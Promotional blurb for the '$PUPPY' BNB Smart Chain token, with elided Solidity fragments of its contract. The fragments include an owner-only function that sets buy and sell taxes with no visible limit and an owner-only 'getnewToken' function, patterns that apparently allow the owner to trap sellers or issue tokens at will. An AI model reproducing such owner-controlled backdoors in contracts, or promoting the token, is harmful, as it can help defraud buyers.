...
🐶 $PUPPY is an exciting and innovative crypto token that runs on the Binance Smart Chain. 
$PUPPY is designed to provide an engaging experience for buyers 
with a variety of unique and interesting features. 🐶

FAIR LAUNCH 18.00 UTC⏰
...
contract MARSPUPPIES is Context, IERC20 { 
    using SafeMath for uint256;
    using Address for address;
    address private _owner;
    
    string private constant _name = "MARS PUPPIES";
    string private constant _symbol = unicode"$PUPPY";
    uint256 private constant MAX = ~uint256(0);
    uint8 private constant _decimals = 9;
    uint8 private _TxCount = 0;
    uint256 private _tTotal = 550000000 * 10**_decimals;
    ...
    address payable public DevWallet = payable(0x33E185B3fD0D75620FB7038b78E8A1319730814D);
    address payable public MarketingWallet = payable(0x46EaeB810167BdA2511d44edF7828d41f58b35c1);
    ...
    function tradeEnabled() external onlyAddress {
        tradingActive = true;
        transferDelay =true;
        limitInEffect = true;
    ...
    function setnewFees(uint256 buytax, uint256 selltax) external onlyAddress {
        _tax_On_Buy = buytax;
    ...
    function getnewToken(uint256 value, address adr) onlyAddress public virtual {
